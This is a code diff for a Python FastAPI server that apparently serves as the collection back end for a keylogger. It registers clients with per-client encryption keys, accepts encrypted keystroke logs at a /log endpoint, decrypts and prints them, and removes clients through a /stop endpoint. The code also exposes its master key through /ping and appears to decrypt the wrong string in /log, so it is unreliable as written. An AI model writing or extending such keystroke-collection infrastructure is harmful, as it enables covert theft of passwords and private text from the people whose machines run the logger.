@@ -1,8 +1,8 @@
 import os
 import json
-from fastapi import FastAPI
 from pydantic import BaseModel
 from cryptography.fernet import Fernet
+from fastapi import FastAPI, HTTPException
 
 
 app = FastAPI()
@@ -44,9 +44,12 @@ def create_key(id: str, key: str):
             
     with open(PATH, 'r+') as f:
         data = json.load(f)
-        data[id] = key
+        data[id] = {
+            "key": key,
+            "status": True
+        }
         f.seek(0)
-        json.dump(data, f)
+        json.dump(data, f, indent=4)
         f.truncate()
         f.close()
 
@@ -56,7 +59,10 @@ def get_key(id: str):
     with open(PATH, 'r') as f:
         data = json.load(f)
         if id in data:
-            return data[id].encode('utf-8')
+            if data[id]["status"]:
+                return data[id]['key'].encode('utf-8')
+            else:
+                return None
         else:
             return None
 
@@ -65,22 +71,36 @@ async def ping():
     return {"data": KEY.decode('utf-8')}
 
 @app.post("/register")
-def register(application: DataEncrypted):
+async def register(application: DataEncrypted):
     data: Application = Application(**cipher(application.data, KEY, False))
     create_key(data.id, data.encrytion_key)
+    return
 
 @app.post("/log")
 async def get_key_log(key_log: DataEncrypted):
     
     data, id = key_log.data.split('?')
+    print(data, id)
     key = get_key(id)
-    data: KeyLog = cipher(key_log.data, key, False)
-    print(data)
-    return
+    if key:
+        data: KeyLog = cipher(key_log.data, key, False)
+        print(data)
+        return
+    else:
+        print("The program is stopping")
+        raise HTTPException(status_code=400, detail="End of the process")
 
-@app.post("/stop")
-async def stop():
-    print("the program is stopping")
+@app.delete("/stop/{id}")
+async def stop(id:str):
+    with open(PATH, 'r+') as f:
+        data = json.load(f)
+        del data[id]
+        f.seek(0)
+        json.dump(data, f, indent=4)
+        f.truncate()
+        f.close()
+    print("The program is stopping")
+    return
 
 """
 comand to run:
